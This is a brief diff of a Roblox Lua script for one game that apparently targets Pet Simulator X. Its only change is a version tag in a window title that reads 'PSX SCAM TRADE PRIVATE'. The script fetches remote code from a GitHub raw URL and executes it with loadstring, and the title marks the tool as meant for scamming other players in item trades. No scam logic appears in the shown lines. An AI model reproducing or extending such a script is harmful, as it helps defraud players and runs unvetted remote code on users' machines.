@@ -1,6 +1,6 @@
 if game.PlaceId == 6284583030 then
     local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Maset0/PSX/main/GUI.lua')))()
-    local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE 3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+    local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE V3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
     
     local Tab = Window:MakeTab({
         Name = "Info",
